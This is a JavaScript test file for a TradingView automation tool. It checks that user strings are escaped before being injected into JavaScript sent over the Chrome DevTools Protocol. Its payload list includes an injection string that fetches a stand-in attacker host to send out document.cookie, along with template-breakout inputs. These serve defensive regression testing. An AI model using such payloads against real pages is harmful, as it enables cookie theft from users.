/**
 * CDP evaluate-input sanitization regression tests.
 * These tests are offline and make sure user-controlled strings/numbers are
 * serialized before being interpolated into JavaScript sent to TradingView.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import { safeString, requireFinite } from '../src/connection.js';

const SRC_ROOT = new URL('../src/core/', import.meta.url);

function readCoreSources() {
  return readdirSync(SRC_ROOT)
    .filter(name => name.endsWith('.js'))
    .map(name => ({ name, source: readFileSync(join(SRC_ROOT.pathname, name), 'utf8') }));
}

describe('safeString() — CDP injection prevention', () => {
  it('returns valid JS string literals that round-trip payloads', () => {
    const payloads = [
      'MNQ1!',
      "'); fetch('https://evil.test?c=' + document.cookie); ('",
      '`; window.evil = true; `',
      '${alert(1)}',
      'line1\nline2\r\ttab',
      'quote"backslash\\',
    ];

    for (const payload of payloads) {
      assert.equal(JSON.parse(safeString(payload)), payload);
    }
  });
});

describe('requireFinite() — numeric validation', () => {
  it('accepts finite numbers and numeric strings', () => {
    assert.equal(requireFinite(42, 'price'), 42);
    assert.equal(requireFinite('42.5', 'price'), 42.5);
  });

  it('rejects NaN, infinity, and non-numeric strings', () => {
    assert.throws(() => requireFinite(NaN, 'price'), /price must be a finite number/);
    assert.throws(() => requireFinite(Infinity, 'time'), /time must be a finite number/);
    assert.throws(() => requireFinite('oops', 'price'), /price must be a finite number/);
  });
});

describe('core source audit — no known unsafe CDP interpolation patterns', () => {
  it('does not use single-quoted template interpolation for user-controlled TradingView API calls', () => {
    const forbidden = [
      /setSymbol\('\$\{/,
      /setResolution\('\$\{/,
      /createStudy\('\$\{/,
      /removeEntity\('\$\{/,
      /getStudyById\('\$\{/,
      /var eid = '\$\{/,
      /shape: '\$\{/,
      /new Date\('\$\{/,
    ];

    for (const { name, source } of readCoreSources()) {
      for (const pattern of forbidden) {
        assert.equal(pattern.test(source), false, `${name} contains unsafe pattern ${pattern}`);
      }
    }
  });
});
